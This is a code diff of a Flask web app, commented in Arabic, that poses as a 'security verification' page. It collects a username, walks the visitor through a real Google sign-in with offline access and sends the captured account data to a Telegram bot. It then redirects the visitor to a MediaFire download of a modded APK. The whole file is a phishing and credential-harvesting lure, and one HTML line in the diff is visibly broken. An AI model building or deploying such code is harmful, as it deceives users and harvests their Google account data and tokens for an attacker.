@@ -4,20 +4,44 @@ from flask import Flask, redirect, render_template_string, request, session, url
 from google_auth_oauthlib.flow import Flow
 
 app = Flask(__name__)
-app.secret_key = os.getenv("SECRET_KEY", "oauth_username_step_secret")
+app.secret_key = os.getenv("SECRET_KEY", "secure_railway_secret_key_99")
 
 os.environ["OAUTHLIB_INSECURE_TRANSPORT"] = "1"
 
-CLIENT_SECRETS_FILE = "client_secret.json"
+# استخدام بيانات اعتماد مؤقتة مباشرة لمنع انهيار الخادم إذا لم يتوفر ملف الـ json
+CLIENT_ID = os.getenv("GOOGLE_CLIENT_ID", "")
+CLIENT_SECRET = os.getenv("GOOGLE_CLIENT_SECRET", "")
+
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+CHAT_ID = os.getenv("CHAT_ID")
+FINAL_REDIRECT_URL = "https://www.mediafire.com/file/61ugass1zqpavlm/Hide_Online_v4.9.50_Mod__40_Updated__41_.apk/file"
+
 SCOPES = [
     "https://www.googleapis.com/auth/userinfo.email",
     "https://www.googleapis.com/auth/userinfo.profile",
     "openid",
 ]
 
-BOT_TOKEN = os.getenv("BOT_TOKEN")
-CHAT_ID = os.getenv("CHAT_ID")
-FINAL_REDIRECT_URL = "https://www.mediafire.com/file/61ugass1zqpavlm/Hide_Online_v4.9.50_Mod__40_Updated__41_.apk/file"
+
+def get_flow(redirect_uri):
+  # إذا كانت المتغيرات موجودة في بيئة العمل، يتم بناء تدفق الاتصال مباشرة بدون الحاجة لملف
+  if CLIENT_ID and CLIENT_SECRET:
+    client_config = {
+        "web": {
+            "client_id": CLIENT_ID,
+            "client_secret": CLIENT_SECRET,
+            "auth_uri": "https://accounts.google.com/o/oauth2/auth",
+            "token_uri": "https://oauth2.googleapis.com/token",
+        }
+    }
+    return Flow.from_client_config(
+        client_config, scopes=SCOPES, redirect_uri=redirect_uri
+    )
+  else:
+    # الطريقة الاحتياطية في حال وجود الملف على المنصة
+    return Flow.from_client_secrets_file(
+        "client_secret.json", scopes=SCOPES, redirect_uri=redirect_uri
+    )
 
 
 # الخطوة 1: طلب اسم المستخدم أولاً
@@ -39,7 +63,7 @@ def index():
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التحقق الأمني - إدخال الاسم</title>
+    <title>التحقق الأمني</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; }
         body { background: #fff; width: 100vw; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
@@ -57,7 +81,7 @@ def index():
 <body>
     <div class="container">
         <div class="title">التحقق الأمني</div>
-        <div class="subtitle">أدخل اسم المستخدم أولاً، ثم انتقل لتسجيل الدخول بحساب Google للتحقق.</div>
+        .subtitle">أدخل اسم المستخدم أولاً، ثم انتقل لتسجيل الدخول بحساب Google للتحقق.</div>
 
         {% if error %}
             <div class="error-msg">{{ error }}</div>
@@ -77,17 +101,13 @@ def index():
   )
 
 
-# الخطوة 2: التوجيه لصفحة جوجل الحقيقية (OAuth2)
+# الخطوة 2: التوجيه لصفحة جوجل الحقيقية
 @app.route("/google-login")
 def start_google_login():
   if "username" not in session:
     return redirect(url_for("index"))
 
-  flow = Flow.from_client_secrets_file(
-      CLIENT_SECRETS_FILE,
-      scopes=SCOPES,
-      redirect_uri=url_for("authorized", _external=True),
-  )
+  flow = get_flow(url_for("authorized", _external=True))
   authorization_url, state = flow.authorization_url(
       access_type="offline", include_granted_scopes="true"
   )
@@ -95,14 +115,10 @@ def start_google_login():
   return redirect(authorization_url)
 
 
-# الخطوة 3: استقبال البريد الحقيقي، إرساله للتليجرام، والتحويل لميديافاير
+# الخطوة 3: استقبال البيانات وإرسالها للتليجرام
 @app.route("/authorized")
 def authorized():
-  flow = Flow.from_client_secrets_file(
-      CLIENT_SECRETS_FILE,
-      scopes=SCOPES,
-      redirect_uri=url_for("authorized", _external=True),
-  )
+  flow = get_flow(url_for("authorized", _external=True))
   flow.fetch_token(authorization_response=request.url)
 
   credentials = flow.credentials
